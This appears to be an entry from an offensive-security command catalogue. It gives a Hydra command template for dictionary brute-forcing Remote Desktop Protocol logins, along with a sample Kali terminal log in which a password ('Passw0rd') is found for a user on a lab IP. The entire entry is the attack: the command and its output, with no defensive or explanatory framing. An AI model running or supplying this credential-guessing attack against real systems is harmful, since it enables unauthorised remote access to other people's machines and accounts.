---
id: 9eeb4a79-6245-4b3b-81c3-2ce5e9053600
name: Hydra Dictionary Brute Force Remote Desktop Protocol (RDP)
type: command
executor: ''
data: hydra -L $USER_LIST -P $PASSWORD_LIST rdp://$TARGET_IP
output: 'root@kali:~# hydra -t 1 -f -l victim -P wordlist.txt rdp://10.0.1.105

  Hydra v9.1-dev (c) 2019 by van Hauser/THC & David Maciejak - Please do not use in
  military or secret service organizations, or for illegal purposes.

  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 21:05:23

  [WARNING] the rdp module is experimental. Please test, report - and if possible,
  fix.

  [DATA] max 1 task per 1 server, overall 1 task, 1000 login tries (l:1/p:1000), ~1000
  tries per task

  [DATA] attacking rdp://10.0.1.105:3389/

  [3389][rdp] host: 10.0.1.105   login: victim   password: Passw0rd

  [STATUS] attack finished for 10.0.1.105 (valid pair found)

  1 of 1 target successfully completed, 1 valid password found

  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 21:05:26'
created_at: '2019-09-25T02:38:27.482716+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Hydra Dictionary Brute Force Remote Desktop Protocol (RDP)

```bash
hydra -L $USER_LIST -P $PASSWORD_LIST rdp://$TARGET_IP
```

## Expected Output

```
root@kali:~# hydra -t 1 -f -l victim -P wordlist.txt rdp://10.0.1.105
Hydra v9.1-dev (c) 2019 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 21:05:23
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 1000 login tries (l:1/p:1000), ~1000 tries per task
[DATA] attacking rdp://10.0.1.105:3389/
[3389][rdp] host: 10.0.1.105   login: victim   password: Passw0rd
[STATUS] attack finished for 10.0.1.105 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 21:05:26
```
